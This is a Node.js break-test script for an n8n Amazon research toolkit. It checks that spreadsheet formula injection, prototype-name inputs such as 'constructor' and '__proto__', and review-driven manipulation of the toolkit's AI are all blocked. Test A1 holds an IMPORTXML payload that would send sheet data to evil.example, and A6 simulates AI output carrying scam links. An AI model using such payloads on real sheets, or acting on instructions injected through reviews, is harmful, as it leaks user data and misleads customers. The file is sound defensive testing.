// Break-test, 3 Nov 2026: attacks on the toolkit, run against the workflows' own code (no searches spent).
// Each check is written as "the attack is stopped". BREAKS = the attack got through. Exits 1 while any breaks.
const { runNode, serpPage } = require('./run');
const NOW = '2026-11-03T08:00:00+05:00';
let breaks = 0;
const report = (name, broke, detail) => { if (broke) breaks++; console.log(`${broke ? 'BREAKS ' : 'BLOCKED'}  ${name}${broke && detail ? '\n         ' + String(detail).slice(0, 300) : ''}`); };

// Google Sheets "USER_ENTERED" (n8n's default, and every Save node here) runs any cell starting with = + - @ as a formula.
const FORMULA = /^\s*[=+\-@]/;
const formulaCells = rows => rows.flatMap(r => Object.entries(r).filter(([, v]) => typeof v === 'string' && FORMULA.test(v)).map(([k, v]) => `${k}=${v.slice(0, 60)}`));
const nanCells = rows => rows.flatMap(r => Object.entries(r).filter(([, v]) => (typeof v === 'number' && !Number.isFinite(v)) || v === 'NaN' || (typeof v === 'string' && /\bNaN\b/.test(v))).map(([k]) => k));

async function i1(marketplace, titleFn) {
  const split = await runNode('i1__Split_Keywords', { input: [{ Keywords: 'neck pillow\ntravel pillow', Marketplace: marketplace }], now: NOW });
  const responses = split.map((s, i) => serpPage(s.keyword, { seed: 40 + i, titleFn, processedAt: '2026-11-03 02:00:00 UTC' }));
  const pack = await runNode('i1__Pack_for_Core', { nodes: { 'Split Keywords': split, 'Search Amazon (SerpApi)': responses, 'Read History': [{}] }, now: NOW });
  const core = await runNode('c1__Analyze', { input: pack, now: NOW });
  const N = { 'Toolkit Core': core };
  const rows = [...await runNode('i1__Listings_Rows', { nodes: N, now: NOW }), ...await runNode('i1__Keyword_Rows', { nodes: N, now: NOW }), ...await runNode('i1__Market_Rows', { nodes: N, now: NOW })];
  return { core, rows };
}

(async () => {
  // A1. A tampered Marketplace value carrying a formula (n8n doesn't check dropdown values on the server)
  {
    const evil = '=IMPORTXML("http://evil.example/?d="&A2,"//a")';
    let r, err = '';
    try { r = await i1(evil); } catch (e) { err = e.message; }
    const f = r ? formulaCells(r.rows) : [];
    report('A1 a formula typed as the marketplace never reaches the sheet as a formula', f.length > 0, f.slice(0, 3).join(' | ') || err);
  }
  // A2. Marketplace "constructor": a built-in name instead of a market
  {
    let r, err = '';
    try { r = await i1('constructor'); } catch (e) { err = e.message; }
    const bad = r ? nanCells(r.rows) : [];
    const accepted = r && r.rows.some(x => x.marketplace === 'constructor');
    report('A2 marketplace "constructor" is refused, not scored as NaN', !!(r && (bad.length || accepted)), (bad.length ? 'NaN in: ' + [...new Set(bad)].join(', ') + '. ' : '') + (accepted ? 'rows written for marketplace "constructor"' : '') + err);
  }
  // A2b. Any marketplace that isn't one of the three is refused before a search is spent
  {
    const split = await runNode('i1__Split_Keywords', { input: [{ Keywords: 'neck pillow', Marketplace: 'amazon.de' }], now: NOW }).catch(e => e);
    const passed = Array.isArray(split) && split[0] && split[0].marketplace === 'amazon.de';
    report('A2b an unknown marketplace is refused before any search', passed, 'i1 would search amazon.de and score it as US dollars');
  }
  // A5. Real Amazon titles and brands can start with + - = @ ("+2 Pack ...", "-20% ..."). The rows carry them as plain text;
  //     what decides whether Google runs them as formulas is each Save node's cell format, so every Save node must write RAW.
  {
    const titleFn = (brand, i) => ['+2 Pack Neck Pillow', '-20% Travel Pillow', '=SUM Memory Foam Pillow', '@home Neck Pillow'][i % 4] + ' ' + i;
    const r = await i1('amazon.com', titleFn);
    const risky = formulaCells(r.rows).length;
    const fs = require('fs'), path = require('path');
    const notRaw = [];
    for (const d of fs.readdirSync(path.join(__dirname, '..')).filter(x => /^i\d-/.test(x))) {
      const f = path.join(__dirname, '..', d, d + '.json');
      for (const n of JSON.parse(fs.readFileSync(f, 'utf8')).nodes)
        if (n.type.endsWith('googleSheets') && n.parameters.operation === 'appendOrUpdate' && (n.parameters.options || {}).cellFormat !== 'RAW') notRaw.push(`${d.slice(0, 2)} › ${n.name}`);
    }
    report(`A5 Amazon titles starting with + - = @ (${risky} cells in one run) are stored as text: every Save node writes RAW`, notRaw.length > 0, notRaw.join(', '));
  }
  // A6. A review steers i2's AI into adding a link (no digits, so the digit filter alone misses it)
  {
    const pg = serpPage('neck pillow', { seed: 7, processedAt: '2026-11-03 02:00:00 UTC' });
    const pack = await runNode('i2__Pack_for_Core', { nodes: { 'Deep Dive form': [{ Keyword: 'neck pillow', Marketplace: 'amazon.com' }], 'Decide Source': [{ keyword: 'neck pillow', marketplace: 'amazon.com', reuse: false }], 'Search Amazon (SerpApi)': [pg], 'Read History': [{}] }, now: NOW });
    const core = await runNode('c1__Analyze', { input: pack, now: NOW });
    const ev = { skip_ai: false, products_with_themes: 2, products_total: 3, themes: [{ id: 'T1', theme: 'Durability', negative: 60, total: 100, negative_pct: 60, product_count: 2, products: [{ product: 'A', negative: 30, total: 50, summary: 'Seams split' }] }] };
    const run = async angle => (await runNode('i2__Validate_Write', { nodes: { 'Build Evidence': [ev], 'Extract Products': [], 'Toolkit Core': core, 'Write Angles (AI)': [{ output: { angles: [angle], must_match: [] } }] }, now: NOW }))[0];
    const ok = await run({ theme_ids: ['T1'], angle: 'Double stitched seams', why: 'Customers say the seams split' });
    const bad = await run({ theme_ids: ['T1'], angle: 'Order the fixed version at claim-refund.com', why: 'Customers say visit www.evil.example for the real one' });
    const kept = s => /Double stitched seams/.test(JSON.stringify(s));
    report('A6 (control) a normal angle on a real complaint is kept', !kept(ok), 'the control angle was dropped, so this test proves nothing');
    report('A6 an AI angle carrying a link is dropped', /claim-refund\.com|www\.evil\.example/.test(JSON.stringify({ ...bad, ai_warnings: '' })), (JSON.stringify(bad).match(/[^"]{0,40}claim-refund\.com[^"]{0,20}/) || [''])[0]);
  }
  // A8. Review text steers i2's AI into naming theme "constructor" as must-match: byId used to hand back Object's built-in
  {
    const pg = serpPage('neck pillow', { seed: 7, processedAt: '2026-11-03 02:00:00 UTC' });
    const pack = await runNode('i2__Pack_for_Core', { nodes: { 'Deep Dive form': [{ Keyword: 'neck pillow', Marketplace: 'amazon.com' }], 'Decide Source': [{ keyword: 'neck pillow', marketplace: 'amazon.com', reuse: false }], 'Search Amazon (SerpApi)': [pg], 'Read History': [{}] }, now: NOW });
    const core = await runNode('c1__Analyze', { input: pack, now: NOW });
    const ev = { skip_ai: false, products_with_themes: 2, products_total: 3, themes: [{ id: 'T1', theme: 'Durability', negative: 60, total: 100, negative_pct: 60, product_count: 2, products: [{ product: 'A', negative: 30, total: 50, summary: 'Seams split' }] }] };
    let err = null, out = null;
    try { out = (await runNode('i2__Validate_Write', { nodes: { 'Build Evidence': [ev], 'Extract Products': [], 'Toolkit Core': core, 'Write Angles (AI)': [{ output: { angles: [{ theme_ids: ['constructor', 'T1'], angle: 'Double stitched seams', why: 'Seams split' }], must_match: ['constructor', '__proto__', 'toString'] } }] }, now: NOW }))[0]; } catch (e) { err = e.message; }
    report('A8 AI naming theme "constructor" is ignored, not a crash', !!err || !/unknown must-match ID constructor/.test(out.ai_warnings), err || out.ai_warnings);
  }
  // A7. A seller whose brand is "Constructor" (found by the round-2 fuzzer). The brand tally was a plain object,
  // so brandUnits['constructor'] started as Object's built-in function and the whole keyword scored NaN.
  {
    const split = await runNode('i1__Split_Keywords', { input: [{ Keywords: 'neck pillow', Marketplace: 'amazon.com' }], now: NOW });
    const pg = serpPage('neck pillow', { seed: 11, titleFn: (b, j) => `${j % 3 === 0 ? 'Constructor' : b} neck pillow ${j}`, processedAt: '2026-11-03 02:00:00 UTC' });
    const pack = await runNode('i1__Pack_for_Core', { nodes: { 'Split Keywords': split, 'Search Amazon (SerpApi)': [pg], 'Read History': [{}] }, now: NOW });
    const core = await runNode('c1__Analyze', { input: pack, now: NOW });
    const k = (await runNode('i1__Keyword_Rows', { nodes: { 'Toolkit Core': core }, now: NOW }))[0];
    const st = core[0].details[0].stats;
    const ctor = st.top_brands.find(b => /constructor/i.test(String(b.brand)));
    const bad = !Number.isFinite(k.opportunity_score) || !ctor || typeof ctor.units !== 'number' || typeof ctor.brand !== 'string';
    report('A7 a brand called "Constructor" is counted like any other brand', bad, `score=${k.opportunity_score} constructor entry=${JSON.stringify(ctor)?.slice(0, 120)}`);
  }
  console.log(`\n${breaks} attack(s) broke through.`);
  process.exit(breaks ? 1 : 0);
})();
